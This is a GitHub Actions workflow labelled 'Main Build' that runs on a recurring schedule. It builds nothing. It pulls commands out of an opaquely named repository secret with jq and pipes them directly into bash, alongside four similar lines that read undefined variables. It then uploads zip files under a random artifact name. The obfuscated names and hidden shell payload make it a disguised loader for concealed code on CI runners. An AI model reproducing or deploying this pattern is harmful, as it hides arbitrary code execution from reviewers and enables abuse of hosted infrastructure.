name: Main Build
on:
  workflow_dispatch:

  schedule:
    - cron: '47 5,11,17,23 * * *'
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  run:
    runs-on: ubuntu-latest
    timeout-minutes: 360
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 1
      - name: Build and run
        env:
          wuxsj3: ${{ secrets.wuxsj3 }}
        run: |
          printf '%s' "$wuxsj3" | jq -r .qf833 | /bin/bash
          printf '%s' "$mygwc32" | jq -r .dyugb04851 | /bin/bash
          printf '%s' "$fbglz0163" | jq -r .ppip78592 | /bin/bash
          printf '%s' "$gqr4711" | jq -r .epewt39780 | /bin/bash
          printf '%s' "$uai00" | jq -r .xpr46869 | /bin/bash

      - name: Upload artifact
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: YNhwq7Zs
          path: "*.zip"
          retention-days: 1
